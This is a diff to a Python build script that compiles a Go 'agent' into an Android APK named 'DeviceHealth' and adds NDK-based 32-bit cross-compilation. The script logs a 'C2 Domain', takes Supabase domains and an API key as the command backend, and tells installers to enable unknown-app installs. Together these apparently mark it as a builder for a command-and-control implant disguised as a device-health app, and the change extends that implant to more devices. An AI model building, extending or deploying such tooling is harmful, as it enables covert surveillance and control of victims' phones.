@@ -123,6 +123,62 @@ def find_or_prompt_android_sdk():
     return None
 
 
+def find_ndk():
+    """Find the Android NDK path (bundled with SDK or standalone)."""
+    sdk = find_android_sdk()
+    if sdk:
+        ndk_dir = os.path.join(sdk, "ndk")
+        if os.path.isdir(ndk_dir):
+            # Pick the newest installed NDK version
+            versions = sorted(os.listdir(ndk_dir), reverse=True)
+            for v in versions:
+                candidate = os.path.join(ndk_dir, v)
+                if os.path.isdir(candidate):
+                    return candidate
+        # Side-by-side NDK in sdk/ndk-bundle
+        ndk_bundle = os.path.join(sdk, "ndk-bundle")
+        if os.path.isdir(ndk_bundle):
+            return ndk_bundle
+    # Standalone NDK via env var
+    ndk_home = os.environ.get("ANDROID_NDK_HOME") or os.environ.get("NDK_HOME")
+    if ndk_home and os.path.isdir(ndk_home):
+        return ndk_home
+    return None
+
+
+def _ndk_cc(ndk_path, arch, api_level=23):
+    """Get the NDK Clang cross-compiler path for a given architecture."""
+    # NDK toolchain host tag
+    if IS_WIN:
+        host = "windows-x86_64"
+    elif sys.platform == "darwin":
+        host = "darwin-x86_64"
+    else:
+        host = "linux-x86_64"
+
+    # Map arch to NDK target triple
+    triple_map = {
+        "arm": f"armv7a-linux-androideabi{api_level}",
+        "arm64": f"aarch64-linux-android{api_level}",
+        "x86": f"i686-linux-android{api_level}",
+        "x86_64": f"x86_64-linux-android{api_level}",
+    }
+    triple = triple_map.get(arch)
+    if not triple:
+        return None
+
+    toolchain = os.path.join(ndk_path, "toolchains", "llvm", "prebuilt", host, "bin")
+    ext = ".cmd" if IS_WIN else ""
+    cc = os.path.join(toolchain, f"{triple}-clang{ext}")
+    if os.path.exists(cc):
+        return cc
+    # Some NDK versions use plain clang with --target
+    plain_cc = os.path.join(toolchain, f"clang{ext}")
+    if os.path.exists(plain_cc):
+        return f"{plain_cc} --target={triple}"
+    return None
+
+
 # ============================================================
 # STAGE 1: Compile Go Agent
 # ============================================================
@@ -167,6 +223,26 @@ def compile_agent(domain1, domain2, apikey, arch="arm64"):
         "GOARCH": goarch,
         "CGO_ENABLED": "0",
     }
+
+    # 32-bit Android targets (arm, x86) require CGO with NDK cross-compiler
+    needs_cgo = arch in ("arm", "x86")
+    if needs_cgo:
+        ndk_path = find_ndk()
+        if not ndk_path:
+            log(f"Android NDK required for 32-bit ({arch}) build but not found.", "ERR")
+            log("Install NDK via Android Studio SDK Manager, or:", "ERR")
+            log("  sdkmanager --install ndk-bundle", "ERR")
+            log("  Or set ANDROID_NDK_HOME env var", "ERR")
+            sys.exit(1)
+        cc = _ndk_cc(ndk_path, arch)
+        if not cc:
+            log(f"NDK cross-compiler not found for {arch} in {ndk_path}", "ERR")
+            sys.exit(1)
+        env["CGO_ENABLED"] = "1"
+        env["CC"] = cc
+        if arch == "arm":
+            env["GOARM"] = "7"
+        log(f"Using NDK cross-compiler for {arch} (CGO)")
 
     log(f"Compiling Go agent for android/{goarch}...")
     run(f'go build -trimpath -ldflags="-s -w" -o "{out_path}" .',
@@ -397,8 +473,8 @@ def main():
     parser.add_argument("--domain", help="Primary Supabase domain")
     parser.add_argument("--domain2", help="Secondary Supabase domain")
     parser.add_argument("--apikey", help="Supabase API key")
-    parser.add_argument("--arch", default="arm64",
-                        help="Target architecture (default: arm64). Options: arm64, x86_64")
+    parser.add_argument("--arch", default="arm64,arm",
+                        help="Target architectures, comma-separated (default: arm64,arm). Options: arm64, arm, x86_64, x86. 32-bit (arm/x86) requires Android NDK.")
     parser.add_argument("--output", default="DeviceHealth.apk", help="Output APK filename")
     args = parser.parse_args()
 
@@ -423,15 +499,32 @@ def main():
         log("  .env keys: VITE_SUPABASE_URL, VITE_SUPABASE_PUBLISHABLE_KEY", "ERR")
         sys.exit(1)
 
-    # Parse arch list (32-bit arm/x86 require CGO + Android NDK, not supported)
+    # Parse arch list
     archs = [a.strip() for a in args.arch.split(",")]
-    valid_archs = {"arm64", "x86_64"}
+    valid_archs = {"arm64", "arm", "x86_64", "x86"}
     for a in archs:
         if a not in valid_archs:
             log(f"Invalid architecture: {a}. Valid: {', '.join(sorted(valid_archs))}", "ERR")
-            if a in ("arm", "x86"):
-                log("32-bit targets require Android NDK (CGO). Use arm64 or x86_64.", "ERR")
             sys.exit(1)
+
+    # Check NDK availability for 32-bit targets early
+    needs_ndk = any(a in ("arm", "x86") for a in archs)
+    if needs_ndk:
+        ndk_path = find_ndk()
+        if not ndk_path:
+            log("32-bit targets (arm/x86) require the Android NDK.", "WARN")
+            log("Install via: Android Studio > SDK Manager > SDK Tools > NDK", "WARN")
+            log("Or: sdkmanager --install ndk-bundle", "WARN")
+            # Fall back to 64-bit only
+            archs_64 = [a for a in archs if a not in ("arm", "x86")]
+            if archs_64:
+                log(f"Falling back to 64-bit only: {', '.join(archs_64)}", "WARN")
+                archs = archs_64
+            else:
+                log("No valid architectures remaining. Install NDK or use --arch arm64", "ERR")
+                sys.exit(1)
+        else:
+            log(f"Android NDK found: {ndk_path}", "OK")
 
     log(f"C2 Domain: {domain1}")
     if domain2:
@@ -502,7 +595,7 @@ def main():
     print("       adb uninstall com.devicehealth.service")
     print("       Or: Settings > Apps > Device Health > Uninstall")
     print("    2. Enable 'Install unknown apps' for your file manager/browser")
-    print("    3. Device must be Android 6.0+ (Marshmallow) and 64-bit (arm64)")
+    print("    3. Device must be Android 6.0+ (Marshmallow)")
     print()
 
 
